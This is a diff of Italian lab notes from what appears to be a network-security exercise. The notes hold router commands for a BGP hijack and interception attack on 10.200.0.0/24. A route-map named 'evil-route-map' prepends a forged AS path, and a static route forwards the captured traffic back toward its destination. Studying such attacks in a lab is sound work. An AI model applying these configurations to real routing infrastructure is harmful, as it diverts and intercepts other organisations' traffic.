@@ -1,23 +1,66 @@
-./connect-bgp.sh R200
+adatta i comandi lanciati in base al best path 
+scelto da R100 per raggiungere 10.200.0.0/22
+quindi se sceglie 10 20 200
+applica la route-map sul neighbor 10.10.140.1
+diversamente
+sul neighbor 10.10.110.1
+
+show ip bgp 10.200.0.0
+
+--------------------------------------------------------------------------------
+
+./connect-bgp.sh
+
+>>> CASO 10 20 200
 
 enable
+en
 configure terminal
-
-ip prefix-list evil-prefix-list permit 10.10.200.0/24
-
+ip prefix-list evil-prefix-list permit 10.200.0.0/24
 route-map evil-route-map permit 10
-match ip address prefix-list evil-prefix-list
-set as-path prepend 100 100 100
+   match ip address prefix-list evil-prefix-list
+   set as-path prepend 10 20 200
+exit
+router bgp 100
+   ! network 10.200.0.0/24
+   neighbor 10.10.140.1 route-map evil-route-map out
 
------------------------------------------------------
-
-./connect-bgp.sh R200
+>>> CASO 40 30 200
 
 enable
+en
 configure terminal
+ip prefix-list evil-prefix-list permit 10.200.0.0/24
+route-map evil-route-map permit 10
+   match ip address prefix-list evil-prefix-list
+   set as-path prepend 40 30 200
+exit
+router bgp 100
+   ! network 10.200.0.0/24
+   neighbor 10.10.110.1 route-map evil-route-map out
 
-ip route 10.10.200.0/24 10.10.12.1
+--------------------------------------------------------------------------------
 
------------------------------------------------------
+./connect-zebra.sh
+
+>>> CASO 10 20 200
+
+enable
+en
+configure terminal
+ip route 10.200.0.0/24 10.10.110.1
+
+>>> CASO 40 30 200
+
+enable
+en
+configure terminal
+ip route 10.200.0.0/24 10.10.140.1
+
+--------------------------------------------------------------------------------
 
 verifica con: show running-config
+
+--------------------------------------------------------------------------------
+
+filtro wireshark: bgp.nlri_prefix == 10.200.0.0
